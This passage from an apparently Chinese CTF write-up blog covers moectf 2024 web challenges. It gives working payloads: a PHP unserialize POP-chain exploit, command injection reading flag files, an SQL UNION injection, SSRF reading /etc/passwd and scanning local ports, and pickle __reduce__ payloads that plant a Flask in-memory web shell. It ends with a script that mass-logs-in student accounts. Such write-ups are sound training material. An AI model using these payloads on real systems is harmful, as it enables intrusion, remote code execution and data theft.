class="hljs-keyword">new</span> MouseEvent(<span class="hljs-string">&#x27;click&#x27;</span>, &#123;<br>    <span class="hljs-string">&#x27;view&#x27;</span>: window,<br>    <span class="hljs-string">&#x27;bubbles&#x27;</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-string">&#x27;cancelable&#x27;</span>: <span class="hljs-literal">true</span><br>&#125;);<br><br><span class="hljs-keyword">var</span> button = document.getElementById(<span class="hljs-string">&quot;scope&quot;</span>).getElementsByTagName(<span class="hljs-string">&quot;button&quot;</span>)[<span class="hljs-number">0</span>];<br>button.id = <span class="hljs-number">9</span>; <span class="hljs-comment">// 首先将其ID设置为9</span><br>button.dispatchEvent(<span class="hljs-keyword">event</span>); <span class="hljs-comment">// 手动触发点击事件</span><br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">fla<span class="hljs-name">g4</span>: fdFVUMHJ<br>前往：/fla<span class="hljs-name">g5</span>sxr.php<br></code></pre></td></tr></table></figure><p>第五层：</p><p>提示框输入相应的内容，控制台输入content&#x3D;’aaa’，对应内容打断点</p><p>flag5: fSV90aDF</p><p>第六层：?moe&#x3D;FLAG</p><p>post:moe&#x3D;1</p><p>flag6: rZV9VX2t</p><p>第七层：</p><p>what&#x3D;system(‘cat &#x2F;f*’);</p><p>得到flag：rbm93X1dlQn0&#x3D;</p><p>最后七层的flag拼接base64得到答案</p><p>bW9lY3Rme0FmdEVyX3RoMXNfdFVUMHJfSV90aDFrZV9VX2trbm93X1dlQn0&#x3D;</p><p><strong>moectf{AftEr_th1s_tUT0r_I_th1ke_U_kknow_WeB}</strong></p><h2 id="moe-pop"><a href="#moe-pop" class="headerlink" title="moe pop"></a>moe pop</h2><p>先上源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class000</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$payl0ad</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$what</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">check</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;payl0ad === <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;FAILED TO ATTACK&#x27;</span>);<br>        &#125;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;what;<br>        <span class="hljs-variable">$a</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class001</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$payl0ad</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a-&gt;payload = <span class="hljs-variable language_">$this</span>-&gt;payl0ad;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class002</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$sec</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$b</span>(<span class="hljs-variable language_">$this</span>-&gt;sec);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dangerous</span>(<span class="hljs-params"><span class="hljs-variable">$whaattt</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$whaattt</span>-&gt;<span class="hljs-title function_ invoke__">evvval</span>(<span class="hljs-variable">$this</span>-&gt;sec);<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class003</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mystr</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evvval</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;mystr;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>进行简单的代码审计，从后往前推</p><p>class003有eval函数可以进行利用,class002中调用dangerous函数可以利用拼接，想引用dangerous可以给class001的payl0ad进行赋值利用a来new一个class002,要使用invoke函数的话，可以看class000,首先令payl0ad&#x3D;000,成功正常的，成功给what赋值new class001</p><p>大题的思路就是这样正推的话直接上payload，为了连接起来，部分内容需要修改成public</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$exp</span> = <span class="hljs-keyword">new</span> class000;<br><span class="hljs-variable">$exp</span>-&gt;what=<span class="hljs-keyword">new</span> class001;<br><span class="hljs-variable">$exp</span>-&gt;what-&gt;payl0ad=<span class="hljs-string">&#x27;dangerous&#x27;</span>;<br><span class="hljs-variable">$exp</span>-&gt;what-&gt;a=<span class="hljs-keyword">new</span> class002;<br><span class="hljs-variable">$exp1</span>=<span class="hljs-keyword">new</span> class003;<br><span class="hljs-variable">$exp1</span>-&gt;mystr=<span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br><span class="hljs-variable">$exp</span>-&gt;what-&gt;a-&gt;sec = <span class="hljs-variable">$exp1</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>));<br></code></pre></td></tr></table></figure><p>payl0ad和sec我都改成public了，最后可以在phpinfo里面找到flag,ctrl+f搜索moe</p><h2 id="勇闯铜人阵"><a href="#勇闯铜人阵" class="headerlink" title="勇闯铜人阵"></a>勇闯铜人阵</h2><p>😋之前自己敲完一个代码之后就了解了一些基础了，晚上敲一会出来了，自己代码能力还是要练一下的,关键点可能就是session保持持续会话，我第一次尝试的时候没用到session，第二次是代码逻辑问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> re<br>url = <span class="hljs-string">&#x27;http://127.0.0.1:59353/&#x27;</span><br>session = requests.Session()<br>response = session.get(url)<br>post_data = &#123;<span class="hljs-string">&#x27;player&#x27;</span>: <span class="hljs-string">&quot;123&quot;</span>, <span class="hljs-string">&#x27;direct&#x27;</span>: <span class="hljs-string">&quot;弟子明白&quot;</span>&#125;<br>post_response = session.post(url, data=post_data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_direction</span>(<span class="hljs-params">number</span>):<br>    directions = &#123;<br>        <span class="hljs-number">1</span>: <span class="hljs-string">&quot;北方&quot;</span>,<br>        <span class="hljs-number">2</span>: <span class="hljs-string">&quot;东北方&quot;</span>,<br>        <span class="hljs-number">3</span>: <span class="hljs-string">&quot;东方&quot;</span>,<br>        <span class="hljs-number">4</span>: <span class="hljs-string">&quot;东南方&quot;</span>,<br>        <span class="hljs-number">5</span>: <span class="hljs-string">&quot;南方&quot;</span>,<br>        <span class="hljs-number">6</span>: <span class="hljs-string">&quot;西南方&quot;</span>,<br>        <span class="hljs-number">7</span>: <span class="hljs-string">&quot;西方&quot;</span>,<br>        <span class="hljs-number">8</span>: <span class="hljs-string">&quot;西北方&quot;</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> directions.get(number, <span class="hljs-string">&quot;无效的方向&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract</span>(<span class="hljs-params">html_content</span>):<br>    tag = BeautifulSoup(html_content, <span class="hljs-string">&#x27;html.parser&#x27;</span>).find(<span class="hljs-string">&#x27;h1&#x27;</span>, <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;status&#x27;</span>)<br>    <span class="hljs-keyword">return</span> tag.text <span class="hljs-keyword">if</span> tag <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;状态未找到&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_numbers</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">return</span> [<span class="hljs-built_in">int</span>(num) <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&#x27;\d+&#x27;</span>, text)]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-comment"># 提取状态文本</span><br>    status_text = extract(post_response.text)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;状态: <span class="hljs-subst">&#123;status_text&#125;</span>&quot;</span>)<br><br>    numbers = extract_numbers(status_text)<br>    count = <span class="hljs-built_in">len</span>(numbers)<br><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        ans = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;get_direction(numbers[<span class="hljs-number">0</span>])&#125;</span>&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        ans = <span class="hljs-string">&quot;，&quot;</span>.join([<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;get_direction(num)&#125;</span>一个&quot;</span> <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> numbers])<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;方向: <span class="hljs-subst">&#123;ans&#125;</span>&quot;</span>)<br><br>    payload = &#123;<span class="hljs-string">&#x27;player&#x27;</span>: <span class="hljs-string">&quot;123&quot;</span>, <span class="hljs-string">&#x27;direct&#x27;</span>: ans&#125;<br>    post_response = session.post(url, data=payload)<br><br>    status_text = extract(post_response.text)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;新的状态: <span class="hljs-subst">&#123;status_text&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="电院-Backend"><a href="#电院-Backend" class="headerlink" title="电院_Backend"></a>电院_Backend</h2><p>过了一阵子才写，其实就是简单的sql注入，只是不怎么遇到sql的题目，所以也就不怎么会写了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">test@example.com&#x27; UNION SELECT null, null, null -- <br></code></pre></td></tr></table></figure><p>进行绕过得到flag</p><h2 id="ImageCloud前置"><a href="#ImageCloud前置" class="headerlink" title="ImageCloud前置"></a>ImageCloud前置</h2><p>其实应该算在ssrf里面吧，利用<code>?url=file:///etc/passwd</code>,读取到flag</p><h2 id="ImageCloud"><a href="#ImageCloud" class="headerlink" title="ImageCloud"></a>ImageCloud</h2><p>一开始尝试了图片一句话和vps外带执行命令，完全就是逻辑方向错了。</p><p>根据hint的提示给的是损坏的，但是容器是好的，再细看app2.py的代码（我一开始就没看</p><p>可以得出其实容器开了两个端口？利用**<code>?url=http://127.0.0.1:xxxx/image/flag.jpg</code>**，然后结合bp快速扫一下5001-6000的端口</p><p>就找到flag.jpg所在位置，图片上有flag</p><p><img src="/../../images/moectf/moectf2024/cloud.png" alt="cloud"></p><h2 id="PetStore-复现"><a href="#PetStore-复现" class="headerlink" title="PetStore(复现)"></a>PetStore(复现)</h2><p>是个pickle的题目，写的时候没有往内存马那边想后来请教学长告诉了可以直接打个🐎进去，因为种种原因直到结束都没再写，复现一下。以下是一开始的个人思路。</p><p>关键的代码定位是import_pet部分的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">import_pet</span>(<span class="hljs-params">self, serialized_pet</span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-keyword">try</span>:<br>        pet_data = base64.b64decode(serialized_pet)<br>        pet = pickle.loads(pet_data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(pet, Pet):<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> self.pets:<br>                <span class="hljs-keyword">if</span> i.uuid == pet.uuid:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            self.pets.append(pet)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">export_pet</span>(<span class="hljs-params">self, pet_uuid</span>) -&gt; <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span>:<br>    pet = self.get_pet(pet_uuid)<br>    <span class="hljs-keyword">if</span> pet <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        self.pets.remove(pet)<br>        serialized_pet = base64.b64encode(pickle.dumps(pet)).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        <span class="hljs-keyword">return</span> serialized_pet<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br></code></pre></td></tr></table></figure><p>要反序列化读取env得到flag，dockerfile是写在env里的，容器不出网，题目容器侧无法主动发起与外部网络的连接。</p><p>测试了正常的通过uuid收养一个新宠物正常通过然后改成<code>__reduce__</code>想读取env，但是读取不通</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pet</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, species, uuid</span>):<br>        self.name = name<br>        self.species = species<br>        self.uuid = uuid<br><span class="hljs-comment">#def __repr__(self):</span><br>    <span class="hljs-comment">#   return f&quot;Pet(name=&#123;self.name&#125;, species=&#123;self.species&#125;, uuid=&#123;self.uuid&#125;)&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">&quot;env&quot;</span>,))<br>    <span class="hljs-comment">#return eval,(&quot;__import__(&#x27;os&#x27;).system(&#x27;env&#x27;)&quot;,)</span><br><br>uuid = <span class="hljs-built_in">str</span>(uuid.uuid4())<br><span class="hljs-built_in">print</span>(uuid)<br>a= pickle.dumps(pet)<br><span class="hljs-built_in">print</span>(a)<br>encoded_pet = base64.b64encode(a).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Encoded Payload: <span class="hljs-subst">&#123;encoded_pet&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>(ps:想想其实有什么空白文件把内容打印到上面也行的，还是老老实实打个内存马吧)然后是正常的推进思路打个内存马进去</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pet</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        cmd_injection = <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]&quot;</span><br>                      <span class="hljs-string">&quot;.before_request_funcs.setdefault(None, []).append(lambda :&quot;</span> + cmd_injection + <span class="hljs-string">&quot;)&quot;</span>,)<br><br><span class="hljs-comment"># 创建类实例并序列化为pickle，再进行base64编码</span><br>a = Pet()<br>b = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(base64.b64encode(b).decode())<br></code></pre></td></tr></table></figure><p>然后执行<code>?cmd=env</code>可以读取flag</p><h2 id="Re-从零开始的-XDU-教书生活-复现"><a href="#Re-从零开始的-XDU-教书生活-复现" class="headerlink" title="Re: 从零开始的 XDU 教书生活(复现)"></a>Re: 从零开始的 XDU 教书生活(复现)</h2><p>困惑点在我怎么得到所有学生的学号以及密码登陆，因为是python写还需要分析加密逻辑，以及由于是动态的二维码图片，我想的是一个程序跑登陆学生，一个程序教师端登陆不断的发包请求识别下载二维码以保证图片的，可能确实是思路发散的太多了</p><p>代码思路是首先，使用老师的账号登录并获取二维码，然后退出登录。用每个学生的账号进行登录，使用事先获取的签到 URL 来完成签到。xxx需要自己填对应内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;xxx&#x27;</span><br>teacher_phone = <span class="hljs-string">&#x27;10000&#x27;</span><br>password = teacher_phone<br><br>QR_code_params = &#123;<br>    <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">&quot;xxx&quot;</span>,<br>    <span class="hljs-string">&quot;c&quot;</span>: <span class="hljs-string">&quot;xxx&quot;</span>,<br>    <span class="hljs-string">&quot;enc&quot;</span>: <span class="hljs-string">&quot;xxx&quot;</span>,<br>    <span class="hljs-string">&quot;DB_STRATEGY&quot;</span>: <span class="hljs-string">&quot;PRIMARY_KEY&quot;</span>,<br>    <span class="hljs-string">&quot;STRATEGY_PARA&quot;</span>: <span class="hljs-string">&quot;id&quot;</span><br>&#125;<br><br><span class="hljs-comment"># 持续化 session</span><br>session = requests.session()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">teacher_login</span>():<br>    <span class="hljs-keyword">try</span>:<br>        response = session.post(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/fanyalogin&quot;</span>, data=&#123;<br>            <span class="hljs-string">&quot;uname&quot;</span>: teacher_phone,<br>            <span class="hljs-string">&quot;password&quot;</span>: password<br>        &#125;)<br>        response_data = response.json()<br>        <span class="hljs-keyword">if</span> response_data.get(<span class="hljs-string">&#x27;status&#x27;</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Teacher logged in successfully.&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Teacher login failed.&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error during teacher login: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">raise</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_student_account</span>():<br>    <span class="hljs-keyword">try</span>:<br>        response = session.get(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/widget/sign/pcTeaSignController/showSignInfo1&quot;</span>)<br>        students = response.json().get(<span class="hljs-string">&quot;data&quot;</span>, &#123;&#125;).get(<span class="hljs-string">&quot;changeUnSignList&quot;</span>, [])<br>        <span class="hljs-keyword">return</span> [student[<span class="hljs-string">&quot;uid&quot;</span>] <span class="hljs-keyword">for</span> student <span class="hljs-keyword">in</span> students]<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error fetching student account: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> []<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">student_login</span>(<span class="hljs-params">phone</span>):<br>    <span class="hljs-keyword">try</span>:<br>        response = session.post(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/fanyalogin&quot;</span>, data=&#123;<br>            <span class="hljs-string">&quot;uname&quot;</span>: <span class="hljs-built_in">str</span>(phone),<br>            <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-built_in">str</span>(phone)<br>        &#125;)<br>        <span class="hljs-keyword">return</span> response.json().get(<span class="hljs-string">&#x27;status&#x27;</span>, <span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error during student login for <span class="hljs-subst">&#123;phone&#125;</span>: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_QR</span>():<br>    <span class="hljs-keyword">try</span>:<br>        response = session.get(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/widget/sign/e&quot;</span>, params=QR_code_params)<br>        <span class="hljs-keyword">return</span> response.text<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error scanning QR code: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    teacher_login()<br>    student_phones = get_student_account()<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> student_phones:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No students to process.&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    successful_sign_ins = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> index, phone <span class="hljs-keyword">in</span> <span 